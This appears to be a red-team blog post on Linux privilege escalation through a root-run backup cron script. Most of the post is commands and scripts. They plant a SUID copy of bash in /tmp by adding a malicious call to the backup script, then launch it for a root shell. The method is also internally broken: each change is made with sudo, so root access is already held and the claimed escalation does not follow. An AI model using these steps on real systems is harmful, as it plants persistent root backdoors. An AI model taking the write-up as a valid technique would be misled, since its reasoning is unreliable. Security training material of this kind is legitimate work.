---
title: "
Privilege Escalation Using Cron and Rsync"
date: 2023-02-05 14:15:24
categories: [privilege-escalation, linux]
tags: [redteam, privilege-escalation, linux]
---

Many systems rely on automated scripts for maintenance and backups. These scripts, if poorly configured or inadequately protected, can be exploited for privilege escalation. Recently, we identified a vulnerability in a system where a backup script was used to gain root access. This article details how we exploited this vulnerability and the steps taken to gain elevated privileges.

#### Step 1: Gaining Initial Access 

We obtained SSH access to the target system using user credentials. This initial access was essential to explore and identify potential vulnerabilities in the system.

#### Step 2: Identifying the Attack Vector 
During our system analysis, we observed that a backup script was being periodically executed with root privileges. The script located at `/usr/local/bin/backup.sh` used `rsync` to synchronize files from the `/opt` directory to `/backup/opt/`. This cron job was set to run at system boot.
The content of the existing backup script was:


```bash
#!/bin/bash

echo "$(date): Executing backup" >> /var/log/backup.log

while true; do
    rsync -av --delete /opt/ /backup/opt/
    sleep 3
done
```

#### Step 3: Creating the Malicious Script 

To exploit this configuration, we created a malicious script to be executed as part of the backup process. This malicious script creates a SUID shell, allowing any user who executes the shell to gain root privileges.


```bash
sudo nano /opt/pre_backup.sh
```

The content of the script is:


```bash
#!/bin/bash

# Log execution
echo "$(date): Executing pre_backup.sh" >> /var/log/pre_backup.log

# Create a SUID shell
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

#### Step 4: Modifying the Backup Script 

With the malicious script in place, we modified the existing backup script to call our malicious script during each execution.


```bash
sudo nano /usr/local/bin/backup.sh
```

The modified backup script is:


```bash
#!/bin/bash

echo "$(date): Executing backup" >> /var/log/backup.log

while true; do
    rsync -av --delete /opt/ /backup/opt/
    
    # Execute the malicious script
    /opt/pre_backup.sh
    
    sleep 3
done
```

#### Step 5: Restarting the System 

To ensure the changes take effect, we restarted the system:


```bash
sudo reboot
```

Although the cron job is configured to run at boot, it is not necessary to reboot the system. We can ensure that the backup script is running and manually call the malicious script. First, we check if the backup script is running:

```bash
ps aux | grep backup
```

If the backup script is not running, we can start it manually:

```bash
sudo /usr/local/bin/backup.sh &
```

#### Step 6: Verifying the Execution of the Malicious Script 

After rebooting, we checked the log file to confirm the execution of the malicious script:


```bash
sudo cat /var/log/pre_backup.log
```

#### Step 7: Gaining Root Access 
We confirmed that the SUID shell was created at `/tmp/rootbash`:

```bash
ls -l /tmp/rootbash
```

By executing the SUID shell, we obtained a root shell:


```bash
/tmp/rootbash -p
```

### Conclusion 

This process highlighted a common vulnerability in many systems: poorly protected backup and maintenance scripts. To prevent such vulnerabilities, it is crucial to follow strict security practices, including:

- Reviewing and restricting file and script permissions.

- Implementing logs and alerts for suspicious activities.

- Conducting regular security audits on automated scripts.

Exploiting backup scripts for privilege escalation is a classic example of how IT security requires attention to detail and a proactive approach to risk mitigation.

### Security Warning 

This article is provided for educational and testing purposes only in controlled environments. Unauthorized use of the techniques described on real systems is illegal and unethical. Always obtain explicit permission before conducting security tests.


---

**References:**  
1. [HackTricks: Privilege Escalation via Cron Jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
 
2. [TryHackMe Linux Privilege Escalation Room](https://tryhackme.com/room/linprivesc)